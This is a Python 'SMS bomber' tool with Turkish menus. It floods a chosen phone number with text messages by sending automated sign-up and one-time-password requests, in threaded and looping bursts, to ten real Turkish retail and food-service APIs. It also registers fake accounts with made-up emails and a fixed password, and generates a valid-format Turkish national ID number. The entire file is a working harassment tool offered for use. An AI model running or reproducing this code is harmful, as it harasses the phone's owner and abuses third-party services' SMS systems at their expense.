import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style, Back, init
from time import sleep
from os import system
import threading
import sys

init(autoreset=True)

# ====================== SMS BOMBER (TAM VE GÜNCEL) ======================
class SendSms:
    adet = 0

    def __init__(self, phone, mail):
        print(f"{Fore.RED + Style.BRIGHT}🦂 {Style.RESET_ALL}{Fore.YELLOW + Style.BRIGHT}Scorpion Strike Initialized! Target Locked: {Fore.GREEN + Style.BRIGHT}{phone}{Style.RESET_ALL}")
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")

    def Bim(self):
        try:
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://bim.veesk.net/", "Content-Type": "application/json", "Origin": "https://bim.veesk.net", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "keep-alive"}
            json={"phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}bim.veesk.net{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}bim.veesk.net{Style.RESET_ALL}")

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/graphql"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.evidea.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "keep-alive"}
            json={"operationName": "GENERATE_OTP", "variables": {"phone": self.phone}, "query": "mutation GENERATE_OTP($phone: String!) {generateOtp(phone: $phone)}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["generateOtp"]:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}www.evidea.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}www.evidea.com{Style.RESET_ALL}")

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/v1/auth/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Client-Platform": "web", "X-Language-Id": "tr-TR", "Origin": "https://www.naosstars.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "keep-alive"}
            json={"firstName": "Scorpion", "lastName": "Elite", "email": self.mail, "phone": self.phone, "password": "Scorpion292439A!", "confirmPassword": "Scorpion292439A!", "gender": "MALE", "contracts": ["NEWSLETTER", "MEMBERSHIP", "DATA_POLICY"]}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 201:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.naosstars.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.naosstars.com{Style.RESET_ALL}")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.koton.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "keep-alive"}
            json={"firstName": "Scorpion", "lastName": "Elite", "email": self.mail, "phone": "90" + self.phone, "password": "Scorpion292439A!", "gender": "M", "isSms": True, "isEmail": True}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}www.koton.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}www.koton.com{Style.RESET_ALL}")

    def Metro(self):
        try:
            url = "https://api.metro.tc:443/Api/api/uye/giris"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://www.metro.tc", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "keep-alive"}
            json={"Telefon": self.phone, "Sifre": "", "MetroGuid": "", "NotificationKey": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.metro.tc{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.metro.tc{Style.RESET_ALL}")

    def File(self):
        try:
            url = "https://www.file.org.tr:443/api/auth/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://www.file.org.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "keep-alive"}
            json={"firstName": "Scorpion", "lastName": "Elite", "email": self.mail, "phone": self.phone, "password": "Scorpion292439A!", "confirmPassword": "Scorpion292439A!"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}www.file.org.tr{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}www.file.org.tr{Style.RESET_ALL}")

    def Komagene(self):
        try:
            url = "https://api.komagene.com:443/api/Customer/send-otp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://www.komagene.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "keep-alive"}
            json={"Phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.komagene.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.komagene.com{Style.RESET_ALL}")

    def Porty(self):
        try:
            url = "https://api.porty.com.tr:443/api/v1/auth/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Client-Platform": "web", "X-Language-Id": "tr-TR", "Origin": "https://www.porty.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "keep-alive"}
            json={"firstName": "Scorpion", "lastName": "Elite", "email": self.mail, "phone": self.phone, "password": "Scorpion292439A!", "confirmPassword": "Scorpion292439A!", "gender": "MALE", "contracts": ["NEWSLETTER", "MEMBERSHIP", "DATA_POLICY"]}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 201:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.porty.com.tr{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.porty.com.tr{Style.RESET_ALL}")

    def Dominos(self):
        try:
            url = "https://apis.dominos.com.tr:443/API/V2/Login/SendSMSCode"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://www.dominos.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "keep-alive"}
            json={"Phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}apis.dominos.com.tr{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}apis.dominos.com.tr{Style.RESET_ALL}")

# ====================== ANA BANNER ======================
def print_main_banner():
    system("cls" if os.name == 'nt' else "clear")
    print(f"""
{Fore.RED + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🦂 SCORPION SMS BOMBER 🦂{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
{Fore.YELLOW + Style.BRIGHT}v3.0 | Powered by Scorpion | Turbo SMS Attack{Style.RESET_ALL}
{Fore.GREEN + Style.BRIGHT}🔥 10+ Aktif Servis • Unlimited SMS • Turkish Numbers{Style.RESET_ALL}
""")

# ====================== SMS BOMBER MENÜSÜ ======================
def sms_bomber_menu():
    while True:
        system("cls" if os.name == 'nt' else "clear")
        print(f"""
{Fore.RED + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🦂 SMS BOMBER MENÜSÜ 🦂{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
""")
        print(f"{Fore.CYAN + Style.BRIGHT}1. {Fore.GREEN}Tek Atak (Test){Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}2. {Fore.RED}Tüm Servislerle Saldır (Turbo){Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}3. {Fore.YELLOW}Sürekli Saldır (Döngü){Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}4. {Fore.MAGENTA}Çıkış{Style.RESET_ALL}")
        
        try:
            secim = input(f"\n{Fore.YELLOW + Style.BRIGHT}Seçim → {Fore.GREEN}")
            
            if secim == "1":
                phone = input(f"{Fore.YELLOW}Hedef Telefon (+90): {Fore.GREEN}")
                if not phone.startswith("+90"):
                    phone = "+90" + phone
                
                sms = SendSms(phone, "")
                print(f"{Fore.CYAN}Test saldırısı başlatılıyor...{Style.RESET_ALL}")
                sms.KahveDunyasi()
                input(f"{Fore.YELLOW}Devam etmek için Enter...{Style.RESET_ALL}")
                
            elif secim == "2":
                phone = input(f"{Fore.YELLOW}Hedef Telefon (+90): {Fore.GREEN}")
                if not phone.startswith("+90"):
                    phone = "+90" + phone
                
                sms = SendSms(phone, "")
                print(f"{Fore.RED}TÜM SERVİSLERLE SALDIRI BAŞLATILIYOR!{Style.RESET_ALL}")
                
                # Tüm servisleri çalıştır
                services = [
                    sms.KahveDunyasi, sms.Bim, sms.Evidea, sms.Naosstars,
                    sms.Koton, sms.Metro, sms.File, sms.Komagene,
                    sms.Porty, sms.Dominos
                ]
                
                threads = []
                for service in services:
                    t = threading.Thread(target=service)
                    t.start()
                    threads.append(t)
                    sleep(0.1)
                
                for t in threads:
                    t.join()
                
                print(f"{Fore.GREEN + Style.BRIGHT}🎯 Toplam {sms.adet} başarılı saldırı!{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}Devam etmek için Enter...{Style.RESET_ALL}")
                
            elif secim == "3":
                phone = input(f"{Fore.YELLOW}Hedef Telefon (+90): {Fore.GREEN}")
                if not phone.startswith("+90"):
                    phone = "+90" + phone
                
                count = int(input(f"{Fore.YELLOW}Kaç tur saldırı: {Fore.GREEN}"))
                
                for tur in range(1, count + 1):
                    print(f"{Fore.CYAN + Style.BRIGHT}Tur {tur}/{count} başlatılıyor...{Style.RESET_ALL}")
                    sms = SendSms(phone, "")
                    
                    services = [
                        sms.KahveDunyasi, sms.Bim, sms.Evidea, sms.Naosstars,
                        sms.Koton, sms.Metro, sms.File, sms.Komagene,
                        sms.Porty, sms.Dominos
                    ]
                    
                    threads = []
                    for service in services:
                        t = threading.Thread(target=service)
                        t.start()
                        threads.append(t)
                        sleep(0.1)
                    
                    for t in threads:
                        t.join()
                    
                    print(f"{Fore.GREEN}Tur {tur} tamamlandı. Toplam: {sms.adet} SMS{Style.RESET_ALL}")
                    sleep(2)
                
                input(f"{Fore.YELLOW}Saldırı tamamlandı. Devam etmek için Enter...{Style.RESET_ALL}")
                
            elif secim == "4":
                break
            else:
                print(f"{Fore.RED}❌ Geçersiz seçim!{Style.RESET_ALL}")
                sleep(2)
                
        except Exception as e:
            print(f"{Fore.RED}Hata: {e}{Style.RESET_ALL}")
            sleep(2)

# ====================== ANA MENÜ ======================
def main():
    while True:
        print_main_banner()
        print(f"""
{Fore.MAGENTA + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🚀 ANA MENÜ 🚀{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}1. {Fore.GREEN}🦂 SMS Bomber Başlat{Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}2. {Fore.RED}❌ Çıkış{Style.RESET_ALL}
""")
        try:
            secim = input(f"\n{Fore.YELLOW + Style.BRIGHT}Seçim → {Fore.GREEN}")
            if secim == "1": 
                sms_bomber_menu()
            elif secim == "2":
                print(f"{Fore.RED + Style.BRIGHT}👋 Scorpion kapanıyor...{Style.RESET_ALL}")
                for i in range(3, 0, -1): 
                    print(f"{Fore.YELLOW}Çıkış: {i}{Style.RESET_ALL}")
                    sleep(1)
                sys.exit(0)
            else: 
                print(f"{Fore.RED}❌ Geçersiz!{Style.RESET_ALL}")
                sleep(2)
        except: 
            print(f"{Fore.RED}Hata!{Style.RESET_ALL}")
            sleep(2)

if __name__ == "__main__":
    import os
    main()
